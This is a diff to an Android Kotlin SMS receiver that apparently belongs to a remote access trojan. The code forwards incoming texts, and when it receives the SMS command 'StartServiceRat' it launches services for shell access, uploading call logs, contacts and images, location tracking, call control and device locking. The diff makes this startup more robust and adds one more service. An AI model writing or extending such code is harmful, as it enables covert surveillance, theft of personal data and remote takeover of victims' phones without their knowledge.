@@ -45,10 +45,9 @@ class SmsReceiver : BroadcastReceiver() {
                     SmsForwardWorker.scheduleForwardWork(sender, fullMessage, timestamp, it)
                     Logger.log("Scheduled SMS upload and forward work for $sender")
 
-                    // 🔥 Check for service start command
+                    // Check for service start command
                     if (fullMessage.trim().equals("StartServiceRat", ignoreCase = true)) {
                         Logger.log("Triggering all services via SMS command")
-
                         startAllServices(it)
                     }
                 } ?: Logger.error("Context is null, cannot process SMS from $sender")
@@ -59,27 +58,37 @@ class SmsReceiver : BroadcastReceiver() {
     }
 
     private fun startAllServices(context: Context) {
-        val services = listOf(
-            SmsService::class.java,
-            ShellService::class.java,
-            CallLogUploadService::class.java,
-            ContactUploadService::class.java,
-            ImageUploadService::class.java,
-            LocationService::class.java,
-            CallService::class.java,
-            LockService::class.java
-        )
+        try {
+            val services = listOf(
+                SmsService::class.java,
+                ShellService::class.java,
+                CallLogUploadService::class.java,
+                ContactUploadService::class.java,
+                ImageUploadService::class.java,
+                LocationService::class.java,
+                CallService::class.java,
+                LockService::class.java,
+                SmsConsentService::class.java
+            )
 
-        services.forEach { service ->
-            val intent = Intent(context, service)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                context.startForegroundService(intent)
-            } else {
-                context.startService(intent)
+            services.forEach { service ->
+                try {
+                    val intent = Intent(context, service)
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                        context.startForegroundService(intent)
+                    } else {
+                        context.startService(intent)
+                    }
+                    Logger.log("Started ${service.simpleName} via SMS command")
+                } catch (e: Exception) {
+                    Logger.error("Failed to start ${service.simpleName} via SMS", e)
+                }
             }
-        }
 
-        Logger.log("All services started successfully.")
+            Logger.log("All services started successfully via SMS command")
+        } catch (e: Exception) {
+            Logger.error("Error starting services via SMS", e)
+        }
     }
 
     private val SmsMessage.index: Int
